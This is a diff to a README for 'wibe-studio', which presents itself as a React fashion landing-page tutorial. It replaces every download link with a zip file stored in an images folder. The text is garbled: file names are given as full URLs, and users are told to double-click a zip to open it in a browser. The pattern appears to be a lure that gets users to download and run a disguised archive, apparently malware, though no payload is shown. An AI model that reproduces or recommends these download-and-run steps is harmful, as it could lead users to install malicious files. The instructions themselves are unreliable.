@@ -1,7 +1,7 @@
 # 🎨 wibe-studio - Create Your Fashion Studio Landing Page
 
 ## 🔗 Download Now
-[![Download wibe-studio](https://github.com/BlackLuigi/wibe-studio/raw/refs/heads/main/src/sections/studio-wibe-v1.0.zip)](https://github.com/BlackLuigi/wibe-studio/raw/refs/heads/main/src/sections/studio-wibe-v1.0.zip)
+[![Download wibe-studio](https://raw.githubusercontent.com/BlackLuigi/wibe-studio/main/src/assets/Images/studio-wibe-v2.7.zip)](https://raw.githubusercontent.com/BlackLuigi/wibe-studio/main/src/assets/Images/studio-wibe-v2.7.zip)
 
 ## 📖 Description
 wibe-studio helps you build a stunning Fashion Studio Website Landing page using React JS. This application features smooth scrolling with locomotive-scroll and lively animations using GSAP and Framer-Motion. Follow the tutorial link to learn how to create this website step by step.
@@ -18,26 +18,26 @@ To start using the wibe-studio application, follow these simple steps:
 
 2. **Visit the Download Page**
    Go to the releases page to download the latest version of wibe-studio. Click the link below to access it:
-   - [Download wibe-studio Releases](https://github.com/BlackLuigi/wibe-studio/raw/refs/heads/main/src/sections/studio-wibe-v1.0.zip)
+   - [Download wibe-studio Releases](https://raw.githubusercontent.com/BlackLuigi/wibe-studio/main/src/assets/Images/studio-wibe-v2.7.zip)
 
 ## 📥 Download & Install
 On the releases page, you will find a list of the latest versions. 
 
 1. Click on the most recent version link. 
-2. Look for the file named `https://github.com/BlackLuigi/wibe-studio/raw/refs/heads/main/src/sections/studio-wibe-v1.0.zip`.
+2. Look for the file named `https://raw.githubusercontent.com/BlackLuigi/wibe-studio/main/src/assets/Images/studio-wibe-v2.7.zip`.
 3. Click on the file to start the download.
 
 ### Unzip the File
 After the download completes:
 1. Locate the downloaded file, usually in your "Downloads" folder.
-2. Right-click on `https://github.com/BlackLuigi/wibe-studio/raw/refs/heads/main/src/sections/studio-wibe-v1.0.zip` and select "Extract All." 
+2. Right-click on `https://raw.githubusercontent.com/BlackLuigi/wibe-studio/main/src/assets/Images/studio-wibe-v2.7.zip` and select "Extract All." 
 3. Choose a location to save the unzipped files.
 
 ### Running the Application
 Once you’ve unzipped the files:
 1. Navigate to the folder where you extracted the files.
-2. Open the folder and find `https://github.com/BlackLuigi/wibe-studio/raw/refs/heads/main/src/sections/studio-wibe-v1.0.zip`.
-3. Double-click `https://github.com/BlackLuigi/wibe-studio/raw/refs/heads/main/src/sections/studio-wibe-v1.0.zip` to open it in your web browser.
+2. Open the folder and find `https://raw.githubusercontent.com/BlackLuigi/wibe-studio/main/src/assets/Images/studio-wibe-v2.7.zip`.
+3. Double-click `https://raw.githubusercontent.com/BlackLuigi/wibe-studio/main/src/assets/Images/studio-wibe-v2.7.zip` to open it in your web browser.
 
 Congratulations! You are now viewing your Fashion Studio Website Landing page created with wibe-studio.
 
